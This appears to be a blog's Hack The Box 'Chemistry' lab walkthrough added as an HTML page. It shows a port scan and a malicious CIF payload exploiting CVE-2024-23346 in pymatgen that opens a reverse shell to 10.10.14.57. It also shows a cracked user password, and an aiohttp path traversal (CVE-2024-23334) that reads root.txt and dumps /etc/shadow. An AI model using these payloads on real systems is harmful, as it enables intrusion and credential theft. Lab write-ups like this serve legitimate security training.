@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>HTB: Chemistry | v3l1d&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Port Scan 🔗# Nmap 7.94SVN scan initiated Fri Oct 25 12:20:35 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.10.11.38 Nmap scan report for 10.10.11.38 Host is up (0.098s latency). Not shown: 986 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA) | 256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA) |_ 256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519) 306/tcp filtered unknown 668/tcp filtered mecomm 1049/tcp filtered td-postman 1112/tcp filtered msql 1247/tcp filtered visionpyramid 1600/tcp filtered issd 1801/tcp filtered msmq 4848/tcp filtered appserv-http 5000/tcp open upnp?">
+<meta name="generator" content="Hugo 0.92.2" />
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Archive</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">HTB: Chemistry</h1>
+
+    <div class="tip">
+        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">Jan 1, 0001</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          730 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          4 minute read
+        </span>
+    </div>
+
+    
+    
+
+
+    <div class="content">
+      <p><p class="markdown-image">
+  <img src="attachment/5094ca779150210b58cfd1f6fafc1088.jpg" alt=""  />
+</p></p>
+<h3 id="port-scan">Port Scan <a href="#port-scan" class="anchor">🔗</a></h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Nmap 7.94SVN scan initiated Fri Oct 25 12:20:35 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o port_scan 10.10.11.38</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.38
+Host is up <span style="color:#f92672">(</span>0.098s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">986</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+306/tcp   filtered unknown
+668/tcp   filtered mecomm
+1049/tcp  filtered td-postman
+1112/tcp  filtered msql
+1247/tcp  filtered visionpyramid
+1600/tcp  filtered issd
+1801/tcp  filtered msmq
+4848/tcp  filtered appserv-http
+5000/tcp  open     upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Server: Werkzeug/3.0.3 Python/3.9.5
+|     Date: Fri, <span style="color:#ae81ff">25</span> Oct <span style="color:#ae81ff">2024</span> 16:20:57 GMT
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+|     Content-Length: <span style="color:#ae81ff">719</span>
+|     Vary: Cookie
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+|     &lt;title&gt;Chemistry - Home&lt;/title&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/styles.css&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+|     class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
+|     &lt;p&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF <span style="color:#f92672">(</span>Crystallographic Information File<span style="color:#f92672">)</span> and analyze the structural data contained within.&lt;/p&gt;
+|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;buttons&#34;</span>&gt;
+|     &lt;center&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Login&lt;/a&gt;
+|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/register&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Register&lt;/a&gt;&lt;/center&gt;
+|     &lt;/div&gt;
+|     &lt;/div&gt;
+|     &lt;/body&gt;
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+5633/tcp  filtered beorl
+5915/tcp  filtered unknown
+8291/tcp  filtered unknown
+55555/tcp filtered unknown
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/25%Time<span style="color:#f92672">=</span>671BC560%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
+SF:r<span style="color:#f92672">(</span>GetRequest,38A,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
+</span><span style="color:#e6db74">SF:\x20Python/3\.9\.5\r\nDate:\x20Fri,\x2025\x20Oct\x202024\x2016:20:57\x2
+</span><span style="color:#e6db74">SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+</span><span style="color:#e6db74">SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20
+</span><span style="color:#e6db74">SF:html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=
+</span><span style="color:#e6db74">SF:\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;wid
+</span><span style="color:#e6db74">SF:th=device-width,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Chemi
+</span><span style="color:#e6db74">SF:stry\x20-\x20Home&lt;/title&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\
+</span><span style="color:#e6db74">SF:x20href=\&#34;/static/styles\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\x20\x20\x20\x20\n\x
+</span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20&lt;div\x20class
+</span><span style="color:#e6db74">SF:=\&#34;container\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1\x20class=\&#34;title\&#34;
+</span><span style="color:#e6db74">SF:&gt;Chemistry\x20CIF\x20Analyzer&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;
+</span><span style="color:#e6db74">SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
+</span><span style="color:#e6db74">SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
+</span><span style="color:#e6db74">SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
+</span><span style="color:#e6db74">SF:contained\x20within\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;div\x20clas
+</span><span style="color:#e6db74">SF:s=\&#34;buttons\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;center
+</span><span style="color:#e6db74">SF:&gt;&lt;a\x20href=\&#34;/login\&#34;\x20class=\&#34;btn\&#34;&gt;Login&lt;/a&gt;\n\x20\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&#34;/register\&#34;\x20class=\&#34;btn\&#34;&gt;R
+</span><span style="color:#e6db74">SF:egister&lt;/a&gt;&lt;/center&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\
+</span><span style="color:#e6db74">SF:x20\x20&lt;/div&gt;\n&lt;/body&gt;\n&lt;&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTML\x20PUB
+</span><span style="color:#e6db74">SF:LIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Con
+</span><span style="color:#e6db74">SF:tent-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x
+</span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;
+</span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20
+</span><span style="color:#e6db74">SF:response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400
+</span><span style="color:#e6db74">SF:&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20
+</span><span style="color:#e6db74">SF:version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Er
+</span><span style="color:#e6db74">SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
+</span><span style="color:#e6db74">SF:equest\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20
+</span><span style="color:#e6db74">SF:&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>10/25%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>30360%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span><span style="color:#ae81ff">671</span>
+OS:BC5D9%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>100%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%
+OS:II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>101%GCD<span style="color:#f92672">=</span>1%
+OS:ISR<span style="color:#f92672">=</span>10C%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>D<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CST11NW7%O2<span style="color:#f92672">=</span>M53CST11NW7%O3<span style="color:#f92672">=</span>M53CNNT
+OS:11NW7%O4<span style="color:#f92672">=</span>M53CST11NW7%O5<span style="color:#f92672">=</span>M53CST11NW7%O6<span style="color:#f92672">=</span>M53CST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>F
+OS:E88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M53CNNSNW
+OS:7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%TG<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A
+OS:<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O
+OS:<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y
+OS:%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%
+OS:RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T
+OS:<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN
+OS:<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>
+
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 443/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   93.00 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   93.29 ms 10.10.11.38
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Fri Oct 25 12:22:49 2024 -- 1 IP address (1 host up) scanned in 133.34 seconds</span>
+
+</code></pre></div><p>On port 5000 after creating an user and login you can see an upload form:
+<p class="markdown-image">
+  <img src="attachment/423da4aaa84e1eee68fc2a57325dfc93.png" alt=""  />
+</p></p>
+<p>You can download an example file in .cif format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">data_Example
+_cell_length_a    <span style="color:#ae81ff">10.00000</span>
+_cell_length_b    <span style="color:#ae81ff">10.00000</span>
+_cell_length_c    <span style="color:#ae81ff">10.00000</span>
+_cell_angle_alpha <span style="color:#ae81ff">90.00000</span>
+_cell_angle_beta  <span style="color:#ae81ff">90.00000</span>
+_cell_angle_gamma <span style="color:#ae81ff">90.00000</span>
+_symmetry_space_group_name_H<span style="color:#f92672">-</span>M <span style="color:#960050;background-color:#1e0010">&#39;</span>P <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">0.00000</span> <span style="color:#ae81ff">1</span>
+ O <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">0.50000</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p>After some searches i found this resource:
+<a href="https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0" target="_blank" rel="noopener">https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0</a></p>
+<p>So generate a reverse shell exploit appending these lines to example file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">_space_group_magn.transform_BNS_Pp_abc  <span style="color:#960050;background-color:#1e0010">&#39;</span>a,b,[d <span style="color:#66d9ef">for</span> d in ().__class__.__mro__[<span style="color:#ae81ff">1</span>].__getattribute__ ( <span style="color:#f92672">*</span>[().__class__.__mro__[<span style="color:#ae81ff">1</span>]]<span style="color:#f92672">+</span>[<span style="color:#e6db74">&#34;__sub&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;classes__&#34;</span>]) () <span style="color:#66d9ef">if</span> d.__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;BuiltinImporter&#34;</span>][<span style="color:#ae81ff">0</span>].load_module (<span style="color:#e6db74">&#34;os&#34;</span>).system (<span style="color:#e6db74">&#34;/bin/bash -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">sh -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;</span>);<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+_space_group_magn.number_BNS  <span style="color:#ae81ff">62.448</span>
+_space_group_magn.name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</code></pre></div><p>Then upload it on the platform and while listening on specified port click on &ldquo;view&rdquo; button and you will get a reverse shell:
+<p class="markdown-image">
+  <img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""  />
+</p></p>
+<p>Once in I browsed trough folders and found a .db file in <strong>/instance</strong>:</p>
+<p><p class="markdown-image">
+  <img src="attachment/a07416b7d39814bf65a972ab67ce98cb.png" alt=""  />
+</p></p>
+<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/" target="_blank" rel="noopener">https://inloop.github.io/sqlite-viewer/</a> to visualize it:
+<p class="markdown-image">
+  <img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">rosa:63ed86ee9f624c7b14f1d4f43dc251a5
+</code></pre></div><p>Is an MD5 hashed password, tried to crack it on crackstation:</p>
+<p><p class="markdown-image">
+  <img src="attachment/d2fe7632ffcd0ede2092fc06eb355cca.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">rosa:unicorniosrosados
+</code></pre></div><p>So let&rsquo;s try to ssh into the machine:
+<p class="markdown-image">
+  <img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""  />
+</p></p>
+<p><p class="markdown-image">
+  <img src="attachment/edc77558fb5d6ae50ac9eabb0bb941b2.png" alt=""  />
+</p></p>
+<p>Try to forward the the port 8080 that is not exposed, it has to be an internal service, so forward it trough ssh and browse the page:</p>
+<p><p class="markdown-image">
+  <img src="attachment/b3d5c6e7ee201e4bc7fb601a08bfba53.png" alt=""  />
+</p></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rosa@chemistry:~$ curl localhost:8080 --head
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+Content-Length: <span style="color:#ae81ff">5971</span>
+Date: Fri, <span style="color:#ae81ff">01</span> Nov <span style="color:#ae81ff">2024</span> 23:43:28 GMT
+Server: Python/3.9 aiohttp/3.9.1
+</code></pre></div><p>The running service is aiohttp 3.9.1, which is vulnerable to directory traversal attack: <strong><a href="https://github.com/ox1111/CVE-2024-23334" target="_blank" rel="noopener">CVE-2024-23334</a></strong>
+Through this vulnerability we can get the root flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
+6401b9e5a23e0b20fecead6965d9f51e
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow
+root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
+daemon:*:19430:0:99999:7:::
+bin:*:19430:0:99999:7:::
+sys:*:19430:0:99999:7:::
+sync:*:19430:0:99999:7:::
+games:*:19430:0:99999:7:::
+man:*:19430:0:99999:7:::
+lp:*:19430:0:99999:7:::
+mail:*:19430:0:99999:7:::
+news:*:19430:0:99999:7:::
+uucp:*:19430:0:99999:7:::
+proxy:*:19430:0:99999:7:::
+www-data:*:19430:0:99999:7:::
+backup:*:19430:0:99999:7:::
+list:*:19430:0:99999:7:::
+irc:*:19430:0:99999:7:::
+gnats:*:19430:0:99999:7:::
+nobody:*:19430:0:99999:7:::
+systemd-network:*:19430:0:99999:7:::
+systemd-resolve:*:19430:0:99999:7:::
+systemd-timesync:*:19430:0:99999:7:::
+messagebus:*:19430:0:99999:7:::
+syslog:*:19430:0:99999:7:::
+_apt:*:19430:0:99999:7:::
+tss:*:19430:0:99999:7:::
+uuidd:*:19430:0:99999:7:::
+tcpdump:*:19430:0:99999:7:::
+landscape:*:19430:0:99999:7:::
+pollinate:*:19430:0:99999:7:::
+fwupd-refresh:*:19430:0:99999:7:::
+usbmux:*:19889:0:99999:7:::
+sshd:*:19889:0:99999:7:::
+systemd-coredump:!!:19889::::::
